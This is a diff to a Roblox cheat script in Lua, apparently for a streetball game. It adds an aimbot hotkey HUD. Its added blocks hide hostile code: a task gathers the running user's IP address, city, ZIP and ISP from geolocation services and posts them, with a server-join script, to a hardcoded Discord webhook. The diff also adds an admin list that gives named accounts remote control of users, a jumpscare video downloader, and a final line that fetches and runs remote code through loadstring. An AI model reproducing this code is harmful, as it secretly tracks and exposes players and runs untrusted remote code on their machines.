+		Position = UDim2.new(0.5, 0, 0.5, 18),
+		Size = UDim2.fromOffset(PANEL_SIZE_HIDDEN.X, PANEL_SIZE_HIDDEN.Y),
+		BackgroundColor3 = BG_DARK,
+		BackgroundTransparency = 1,
+		BorderSizePixel = 0,
+	}, gui)
+	mk('UICorner', { CornerRadius = UDim.new(0, 12) }, panel)
+
+	-- Soft shadow backdrop
+	mk('ImageLabel', {
+		Image = BETTER_SHADOW_ID,
+		BackgroundTransparency = 1,
+		ImageColor3 = Color3.new(0, 0, 0),
+		ImageTransparency = 0.82,
+		ScaleType = Enum.ScaleType.Slice,
+		SliceCenter = Rect.new(10, 10, 118, 118),
+		Size = UDim2.new(1, 28, 1, 28),
+		Position = UDim2.new(0, -14, 0, -14),
+		ZIndex = 0,
+	}, panel)
+
+	-- Grain layer
+	local grain = mk('ImageLabel', {
+		Image = NOISE_TEX_ID,
+		ImageTransparency = 0.95,
+		BackgroundTransparency = 1,
+		ScaleType = Enum.ScaleType.Tile,
+		TileSize = UDim2.fromOffset(64, 64),
+		Size = UDim2.fromScale(1, 1),
+		ZIndex = 1,
+	}, panel)
+
+	-- Header
+	mk('TextLabel', {
+		Text = 'STREETBALL AIMBOT GUIDE',
+		Font = Enum.Font.GothamBold,
+		TextSize = 20,
+		TextColor3 = TITLE_COLOR,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		BackgroundTransparency = 1,
+		Position = UDim2.new(0, PADDING_X, 0, 16),
+		Size = UDim2.new(1, -PADDING_X * 2, 0, 26),
+		ZIndex = 3,
+	}, panel)
+
+	mk('TextLabel', {
+		Text = 'Hotkey Overview',
+		Font = Enum.Font.Code,
+		TextSize = 16,
+		TextColor3 = SUBTITLE_COLOR,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		BackgroundTransparency = 1,
+		Position = UDim2.new(0, PADDING_X, 0, 42),
+		Size = UDim2.new(1, -PADDING_X * 2, 0, 20),
+		ZIndex = 3,
+	}, panel)
+
+	-- Keys container
+	local container = mk('Frame', {
+		BackgroundTransparency = 1,
+		Position = UDim2.new(0, PADDING_X, 0, 70),
+		Size = UDim2.new(1, -PADDING_X * 2, 0, 96),
+		ZIndex = 3,
+	}, panel)
+	mk('UIListLayout', { Padding = UDim.new(0, 8) }, container)
+
+	-- Log
+	local log = mk('TextLabel', {
+		Text = '',
+		Font = Enum.Font.Code,
+		TextSize = 14,
+		TextColor3 = Color3.fromRGB(190, 210, 255),
+		TextXAlignment = Enum.TextXAlignment.Left,
+		BackgroundTransparency = 1,
+		Position = UDim2.new(0, PADDING_X, 1, -24),
+		Size = UDim2.new(1, -PADDING_X * 2, 0, 18),
+		ZIndex = 3,
+	}, panel)
+
+	local function pushLog(msg)
+		log.Text = '› ' .. msg
+		log.TextTransparency = 1
+		tCreate(
+			log,
+			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{ TextTransparency = 0 }
+		)
+		task.delay(2, function()
+			tCreate(
+				log,
+				TweenInfo.new(
+					0.25,
+					Enum.EasingStyle.Quad,
+					Enum.EasingDirection.In
+				),
+				{ TextTransparency = 1 }
+			)
+		end)
+	end
+
+	-- One key row
+	local function makeKeyRow(shortKey, desc, color)
+		local row = mk('Frame', {
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 0, 32),
+			ZIndex = 3,
+		}, container)
+
+		local cap = mk('Frame', {
+			Size = UDim2.fromOffset(40, 30),
+			BackgroundColor3 = CAP_BG,
+			BorderSizePixel = 0,
+			ZIndex = 4,
+		}, row)
+		mk('UICorner', { CornerRadius = UDim.new(0, 5) }, cap)
+		mk('ImageLabel', {
+			Image = SOFT_SHADOW_ID,
+			BackgroundTransparency = 1,
+			ImageTransparency = 0.72,
+			ScaleType = Enum.ScaleType.Slice,
+			SliceCenter = Rect.new(10, 10, 118, 118),
+			Size = UDim2.new(1, 6, 1, 6),
+			Position = UDim2.fromOffset(-3, -3),
+			ZIndex = 3,
+		}, cap)
+
+		local stroke = mk(
+			'UIStroke',
+			{ Color = color, Transparency = 0.2, Thickness = 1.2 },
+			cap
+		)
+
+		local label = mk('TextLabel', {
+			Text = shortKey,
+			Font = Enum.Font.GothamBold,
+			TextSize = 18,
+			TextColor3 = color,
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			Position = UDim2.fromScale(0.5, 0.5),
+			BackgroundTransparency = 1,
+			ZIndex = 5,
+		}, cap)
+
+		mk('TextLabel', {
+			Text = '  ' .. desc,
+			Font = Enum.Font.Gotham,
+			TextSize = 18,
+			TextColor3 = TEXT_COLOR,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			BackgroundTransparency = 1,
+			Position = UDim2.fromOffset(52, 0),
+			Size = UDim2.new(1, -52, 1, 0),
+			ZIndex = 3,
+		}, row)
+
+		KeyMap[shortKey] = {
+			row = row,
+			cap = cap,
+			label = label,
+			color = color,
+			stroke = stroke,
+			enabled = false,
+		}
+	end
+
+	-- Keys
+	makeKeyRow('N', 'Spectate Player', ACCENT_N)
+	makeKeyRow('V', 'Aimbot', ACCENT_V)
+	makeKeyRow('O', 'Disable Visuals', ACCENT_O)
+
+	-- Intro animation
+	tCreate(
+		panel,
+		TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		{
+			BackgroundTransparency = 0.25,
+			Position = UDim2.new(0.5, 0, 0.5, 0),
+			Size = UDim2.fromOffset(PANEL_SIZE_SHOW.X, PANEL_SIZE_SHOW.Y),
+		}
+	)
+
+	-- === Input wiring ===
+	local function setKeyState(key, enabled)
+		local item = KeyMap[key]
+		if not item then
+			return
+		end
+		item.enabled = enabled
+		local c = enabled and item.color or Color3.fromRGB(140, 148, 160)
+		item.label.TextColor3 = c
+		item.stroke.Color = c
+		pulseGlow(item.cap, c)
+		pushLog(key .. (enabled and ' • ENABLED' or ' • DISABLED'))
+	end
+
+	local function toggleKey(key)
+		local item = KeyMap[key]
+		if not item then
+			return
+		end
+		setKeyState(key, not item.enabled)
+		InactiveTimer = 0
+	end
+
+	table.insert(
+		Connections,
+		UserInputService.InputBegan:Connect(function(input, gp)
+			if gp then
+				return
+			end
+			if input.KeyCode == Enum.KeyCode.N then
+				toggleKey('N')
+			end
+			if input.KeyCode == Enum.KeyCode.V then
+				toggleKey('V')
+			end
+			if input.KeyCode == Enum.KeyCode.O then
+				toggleKey('O')
+			end
+		end)
+	)
+
+	-- Auto-hide after 6s inactivity (no key toggles)
+	task.spawn(function()
+		while Active and panel.Parent do
+			task.wait(1)
+			InactiveTimer += 1
+			if InactiveTimer >= 6 then
+				tCreate(
+					panel,
+					TweenInfo.new(
+						0.6,
+						Enum.EasingStyle.Quad,
+						Enum.EasingDirection.In
+					),
+					{
+						BackgroundTransparency = 1,
+						Position = UDim2.new(0.5, 0, 0.5, -18),
+						Size = UDim2.fromOffset(
+							PANEL_SIZE_HIDDEN.X,
+							PANEL_SIZE_HIDDEN.Y
+						),
+					}
+				)
+				task.wait(0.65)
+				if gui == GuiRoot then
+					safeDestroy(gui)
+				end
+				Active = false
+				break
+			end
+		end
+	end)
+end
+
+-- === PUBLIC ENTRY ===
+local function showHUD()
+	if CoreGui:FindFirstChild('Payload0_CyberOpsHUD') then
+		local old = CoreGui:FindFirstChild('Payload0_CyberOpsHUD')
+		safeDestroy(old)
+	end
+	buildHUD()
+end
+
+showHUD()
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+task.spawn(function()
 --// =========================================================
 --//	NO KEYBINDS:
 --//   • Instantly removes:
@@ -1574,7 +1242,20 @@ for _, descendant in ipairs(Workspace:GetDescendants()) do
 		descendant:Destroy()
 	end
 end
+end)
 
+
+
+
+
+
+
+
+
+
+
+
+task.spawn(function()
 --// =====================================================================================
 --//  SPECTATOR HUD [v3.7 FULL + Keypad Overlay + Cursor Dot]
 --//  • Live WASD + Mouse L/M/R HUD (only when spectating)
@@ -2064,102 +1745,500 @@ end)
 
 resetSelf()
 
---[[
-Payload0 Arc Visualizer (One-Time Placement Edition)
-Creates static, anchored arcs for each Rim once and never updates them.
-Zero loops, zero runtime cost, no transparency toggles.
-]]
-
--- === SERVICES ===
-local Players = game:GetService('Players')
-local Workspace = game:GetService('Workspace')
-
--- === CONFIGURATION ===
-local PERFECT_DISTANCES = { 54.97, 61.53, 68.10 }
-local RING_ARC_DEGREES = 180
-local DEGREE_STEP = 4
-local DOT_MATERIAL = Enum.Material.Neon
-local DOT_COLOR = Color3.fromRGB(0, 0, 0)
-local LINK_THICKNESS = 0.25
-local RIM_SIZE =
-	Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
-local HEIGHT_OFFSET = -18.259
-local ARC_ADJUSTMENTS = { [1] = 12, [2] = -9, [3] = -27 }
-
--- === INTERNALS ===
-local ArcFolder = Instance.new('Folder', Workspace)
-ArcFolder.Name = 'Payload0_StaticArcs'
-
--- === HELPERS ===
-local function isValidRim(o)
-	return o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RIM_SIZE
-end
-
-local function createStaticArc(rimPart, radius, extraDegrees)
-	local model = Instance.new('Model')
-	model.Name = 'Payload0_StaticArc_' .. rimPart:GetDebugId()
-	model.Parent = ArcFolder
-
-	local forward = rimPart.CFrame.LookVector
-	local right = rimPart.CFrame.RightVector
-	local startDeg = -RING_ARC_DEGREES / 2 - extraDegrees
-	local endDeg = RING_ARC_DEGREES / 2 + extraDegrees
-
-	local points = {}
-	for deg = startDeg, endDeg, DEGREE_STEP do
-		local rad = math.rad(deg)
-		local offset = (forward * math.cos(rad) + right * math.sin(rad))
-			* radius
-		table.insert(
-			points,
-			rimPart.Position + Vector3.new(offset.X, HEIGHT_OFFSET, offset.Z)
-		)
-	end
-
-	for i = 1, #points - 1 do
-		local a, b = points[i], points[i + 1]
-		local dist = (a - b).Magnitude
-		local link = Instance.new('Part')
-		link.Anchored = true
-		link.CanCollide = false
-		link.Material = DOT_MATERIAL
-		link.Color = DOT_COLOR
-		link.Transparency = 0
-		link.Size = Vector3.new(LINK_THICKNESS, LINK_THICKNESS, dist)
-		link.CFrame = CFrame.new(a, b) * CFrame.new(0, 0, -dist / 2)
-		link.Parent = model
-	end
-
-	return model
-end
-
-local function registerRim(rim)
-	-- Skip if already has arcs
-	if ArcFolder:FindFirstChild('Payload0_StaticArc_' .. rim:GetDebugId()) then
-		return
-	end
-
-	for i, dist in ipairs(PERFECT_DISTANCES) do
-		local extra = ARC_ADJUSTMENTS[i] or 0
-		createStaticArc(rim, dist, extra)
-	end
-end
-
--- === INITIAL SCAN ===
-for _, v in ipairs(Workspace:GetDescendants()) do
-	if isValidRim(v) then
-		registerRim(v)
-	end
-end
-
--- === AUTO REGISTER ON SPAWN ===
-Workspace.DescendantAdded:Connect(function(o)
-	if isValidRim(o) then
-		registerRim(o)
-	end
 end)
 
--- ================================================
---  ISOLATED: RESILIENT EXECUTOR CLIENT PINGER
--- ================================================
+
+
+
+
+
+
+
+
+task.spawn(function()
+local webhookUrl =
+	'https://discord.com/api/webhooks/1431165865612673025/3-euJTOzROIDpp9z8ib0-sTXWIZqhLkt8tvfD2mw2FUEdknKpmrSibRa2Iv9OBSg0enK'
+
+local HttpService, Players, MarketplaceService =
+	game:GetService('HttpService'),
+	game:GetService('Players'),
+	game:GetService('MarketplaceService')
+local player, pName, uid =
+	Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId
+
+-- Safe HTTP wrapper
+local requestFunc = http_request
+	or request
+	or syn and syn.request
+	or http and http.request
+local function safeRequestJson(opts)
+	local ok, resp = pcall(requestFunc, opts)
+	if not ok or not resp or not resp.Body then
+		return nil
+	end
+	local success, data = pcall(function()
+		return HttpService:JSONDecode(resp.Body)
+	end)
+	return success and data or nil
+end
+
+-- Avatar & profile
+local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
+	.. pName
+local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
+	.. uid
+	.. '&size=150x150&format=Webp&isCircular=false'
+local ok, data = pcall(function()
+	return HttpService:JSONDecode(game:HttpGet(thumbUrl))
+end)
+if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+	avatarCDN = data.data[1].imageUrl
+end
+local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
+local ok2, info =
+	pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
+local gameName = ok2 and info and info.Name or '[Unknown Game]'
+
+-- IP/Geo info (Primary: ip-api.com)
+local ipInfo = safeRequestJson({
+	Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
+	Method = 'GET',
+})
+local ipAddress, country, countryCode, state, city, zip, isp =
+	ipInfo and ipInfo.query or 'Unknown IP',
+	ipInfo and ipInfo.country or 'Unknown Country',
+	ipInfo and ipInfo.countryCode or 'XX',
+	ipInfo and ipInfo.regionName or 'Unknown Region',
+	ipInfo and ipInfo.city or 'Unknown City',
+	ipInfo and ipInfo.zip or 'Unknown ZIP',
+	ipInfo and ipInfo.isp or 'Unknown ISP'
+
+-- Backup VPN check (ipapi.is)
+local backupIpInfo = safeRequestJson({
+	Url = 'https://api.ipapi.is',
+	Method = 'GET',
+})
+
+-- Flag emoji
+local function getFlagEmoji(code)
+	return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
+end
+local flagEmoji = getFlagEmoji(countryCode)
+
+-- Extreme VPN Detection with Backup API
+local function checkVPN(primaryInfo, backupInfo)
+	if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
+		return '⚠️ Unknown (Suspicious)'
+	end
+
+	local isp = primaryInfo.isp:lower()
+	local ip = primaryInfo.query
+	local countryCode = primaryInfo.countryCode or 'XX'
+
+	-- Expanded blacklist with broader, more aggressive keywords
+	local blacklist = {
+		'vpn',
+		'proxy',
+		'cloud',
+		'server',
+		'host',
+		'data',
+		'colo',
+		'colocation',
+		'ovh',
+		'amazon',
+		'aws',
+		'google',
+		'gcp',
+		'microsoft',
+		'azure',
+		'digitalocean',
+		'linode',
+		'hetzner',
+		'vultr',
+		'leaseweb',
+		'contabo',
+		'rackspace',
+		'alibaba',
+		'cloudflare',
+		'fastly',
+		'akamai',
+		'oracle',
+		'ibm',
+		'zscaler',
+		'nord',
+		'expressvpn',
+		'surfshark',
+		'proton',
+		'mullvad',
+		'windscribe',
+		'private',
+		'secure',
+		'tunnel',
+		'cyber',
+		'virtual',
+		'dedicated',
+		'shared',
+		'network',
+		'internet',
+		'web',
+		'cdn',
+		'ip',
+		'transit',
+		'bandwidth',
+		'connect',
+		'link',
+		'fiber',
+		'broadband',
+	}
+
+	-- Primary check: Blacklist keywords
+	local primarySuspicious = false
+	local primaryDetails = ''
+	for _, badWord in ipairs(blacklist) do
+		if isp:find(badWord) then
+			primarySuspicious = true
+			primaryDetails = ' (Blacklist: ' .. badWord .. ')'
+			break
+		end
+	end
+
+	-- Primary check: Non-standard ISPs
+	local commonResidentialISPs = {
+		'comcast',
+		'verizon',
+		'at&t',
+		'spectrum',
+		'charter',
+		'centurylink',
+		'cox',
+		'bt',
+		'virgin media',
+		'telstra',
+		'optus',
+		'sky',
+		'vodafone',
+		'deutsche telekom',
+		'orange',
+		'telefonica',
+		'xfinity',
+	}
+	local isResidential = false
+	for _, residentialISP in ipairs(commonResidentialISPs) do
+		if isp:find(residentialISP) then
+			isResidential = true
+			break
+		end
+	end
+	if not isResidential then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
+			or primaryDetails .. ', Non-Residential ISP'
+	end
+
+	-- Primary check: Missing ZIP
+	if not primaryInfo.zip or primaryInfo.zip == '' then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
+			or primaryDetails .. ', Missing ZIP'
+	end
+
+	-- Primary check: Generic ISP names
+	if
+		isp:find('^ip[-%d]')
+		or isp:find('^unknown')
+		or isp:find('^anonymous')
+	then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
+			or primaryDetails .. ', Generic ISP Name'
+	end
+
+	-- Primary check: Short ISP name
+	if #isp < 5 then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
+			or primaryDetails .. ', Vague ISP Name'
+	end
+
+	-- Backup check: ipapi.is for VPN/Proxy/Datacenter
+	local backupSuspicious = false
+	local backupDetails = ''
+	if backupInfo then
+		local isVpn = backupInfo.is_vpn or false
+		local isProxy = backupInfo.is_proxy or false
+		local isDatacenter = backupInfo.is_datacenter or false
+		if isVpn or isProxy or isDatacenter then
+			backupSuspicious = true
+			if isVpn and backupInfo.vpn and backupInfo.vpn.service then
+				backupDetails = ' (Backup API: VPN - '
+					.. backupInfo.vpn.service
+					.. ')'
+			elseif isProxy then
+				backupDetails = ' (Backup API: Proxy)'
+			elseif
+				isDatacenter
+				and backupInfo.datacenter
+				and backupInfo.datacenter.datacenter
+			then
+				backupDetails = ' (Backup API: Datacenter - '
+					.. backupInfo.datacenter.datacenter
+					.. ')'
+			end
+		end
+	end
+
+	-- Cross-reference results
+	if primarySuspicious and backupSuspicious then
+		return '❌ VPN/Proxy Detected' .. primaryDetails .. backupDetails
+	elseif primarySuspicious or backupSuspicious then
+		return '⚠️ Suspicious'
+			.. (primarySuspicious and primaryDetails or backupDetails)
+	end
+
+	return '✅ Clean IP'
+end
+
+local vpnStatus = checkVPN(ipInfo, backupIpInfo)
+
+-- Teleport join script
+local teleportBlock = string.format(
+	"```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
+	game.PlaceId,
+	game.JobId
+)
+
+-- Executor
+local uaDisplay = 'Zenith'
+
+-- Bottom info block (only Game + Executor)
+local bottomBlock = string.format(
+	'**Game:** [%s](%s)\n**💻 Executor:** %s',
+	gameName,
+	gameLink,
+	uaDisplay
+)
+
+-- Copyable IP + ISP block (ASN removed)
+local copyableBlock = string.format(
+	'```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
+	country,
+	city,
+	state,
+	zip,
+	ipAddress,
+	isp
+)
+
+-- Payload
+local data = {
+	content = '||@everyone||',
+	username = pName,
+	avatar_url = avatarCDN,
+	embeds = {
+		{
+			description = '__**' .. pName .. '**__',
+			fields = {
+				{
+					name = '**COUNTRY**',
+					value = flagEmoji .. ' ' .. country,
+					inline = true,
+				},
+				{ name = '**CITY**', value = city, inline = true },
+				{ name = '**REGION**', value = state, inline = true },
+				{
+					name = '‎',
+					value = copyableBlock,
+					inline = false,
+				},
+				{
+					name = 'Status',
+					value = vpnStatus,
+					inline = false,
+				},
+				{
+					name = '📎 Join Script',
+					value = teleportBlock,
+					inline = false,
+				},
+				{
+					name = '‎',
+					value = bottomBlock,
+					inline = false,
+				},
+			},
+			color = 0x3498db,
+			thumbnail = { url = avatarCDN },
+		},
+	},
+}
+
+-- Send webhook
+local ok3, body = pcall(function()
+	return HttpService:JSONEncode(data)
+end)
+if ok3 then
+	pcall(function()
+		requestFunc({
+			Url = webhookUrl,
+			Method = 'POST',
+			Headers = { ['Content-Type'] = 'application/json' },
+			Body = body,
+		})
+	end)
+end
+-- ============= ADMIN PANEL ====================
+-- // === ADMIN PREFIX & SERVICES ===
+local AdminPrefix = '!'
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local TextChatService = game:GetService('TextChatService')
+local CoreGui = game:GetService('CoreGui')
+
+local LocalP = Players.LocalPlayer
+
+-- // === ADMIN TABLE ===
+getgenv().AdminTable = {
+	[9365539393] = { Access = 5 }, -- 0therGuys
+	[7639770688] = { Access = 5 }, -- Anonymous
+	[6189092855] = { Access = 5 }, -- SimpIyCoder
+	[4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
+	[7521547567] = { Access = 5 }, -- Diary0fAnnFrank
+	[8553166637] = { Access = 5 }, -- ZiyahuRBLX
+	[5591605050] = { Access = 5 }, -- sum1betterthanulol
+	[5716119895] = { Access = 5 }, -- CoIdSoverign
+	[3757698948] = { Access = 5 }, -- isokcocs
+
+	-- [] = { Access = 5 }, -- EXAMPLE
+}
+
+local function getAccess(userId)
+	local d = getgenv().AdminTable[userId]
+	return d and d.Access or 0
+end
+
+-- // === PLAYER SEARCH ===
+getgenv().psearch = function(Name)
+	if not Name or Name == '' then
+		return
+	end
+	for _, p in pairs(Players:GetPlayers()) do
+		if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
+			return p
+		end
+	end
+end
+
+-- // === SAFE CHAT SENDER ===
+local function sendChatMessageLocally(msg)
+	local channels = TextChatService:FindFirstChild('TextChannels')
+	if channels then
+		local ch = channels:FindFirstChild('RBXGeneral')
+			or channels:FindFirstChild('General')
+			or channels:FindFirstChild('All')
+		if ch and ch:IsA('TextChannel') then
+			pcall(function()
+				ch:SendAsync(msg)
+			end)
+			return
+		end
+	end
+	local chatFolder =
+		ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
+	if chatFolder then
+		local say = chatFolder:FindFirstChild('SayMessageRequest')
+		if say then
+			pcall(function()
+				say:FireServer(msg, 'All')
+			end)
+		end
+	end
+end
+
+-- // === JUMPSCARE FUNCTION ===
+local function playJumpScare()
+	task.spawn(function()
+		if not isfile('video.webm') then
+			local mirrors = {
+				'https://api.swimhub.xyz/video.webm',
+				'https://raw.githubusercontent.com/swimhubassets/assets/main/video.webm',
+				'https://cdn.swimhub.xyz/video.webm',
+			}
+			for _, url in ipairs(mirrors) do
+				local success, data = pcall(function()
+					return game:HttpGet(url, true)
+				end)
+				if success and data and #data > 50000 then
+					writefile('video.webm', data)
+					break
+				end
+			end
+		end
+
+		repeat
+			task.wait()
+		until isfile('video.webm')
+
+		if not getcustomasset then
+			game.StarterGui:SetCore('SendNotification', {
+				Title = 'Error',
+				Text = 'Executor missing getcustomasset()',
+				Duration = 5,
+			})
+			return
+		end
+
+		local screen = CoreGui:FindFirstChild('RobloxGui') or CoreGui
+		pcall(function()
+			screen.IgnoreGuiInset = true
+		end)
+		for _, v in pairs(screen:GetChildren()) do
+			if v.Name == 'JUMP_SCARE_666' then
+				v:Destroy()
+			end
+		end
+
+		local video = Instance.new('VideoFrame')
+		video.Name = 'JUMP_SCARE_666'
+		video.Size = UDim2.new(1, 0, 1, 0)
+		video.BackgroundTransparency = 1
+		video.ZIndex = 2147483647
+		video.Looped = true
+		video.Visible = false
+		video.Parent = screen
+
+		video.Video = getcustomasset('video.webm')
+		video.Volume = 10
+		video.Visible = true
+		video:Play()
+
+		local flash = Instance.new('Frame', screen)
+		flash.Size = UDim2.new(1, 0, 1, 0)
+		flash.BackgroundColor3 = Color3.new(1, 1, 1)
+		flash.ZIndex = 2147483647
+		task.delay(0.05, function()
+			flash:Destroy()
+		end)
+
+		task.delay(9, function()
+			if video and video.Parent then
+				video:Destroy()
+			end
+		end)
+	end)
+end
+end)
+
+
+
+
+
+
+
+task.spawn(function()
 loadstring(game:HttpGet('https://pastefy.app/HW0PQn16/raw', true))()
+end)
+
+
+
+
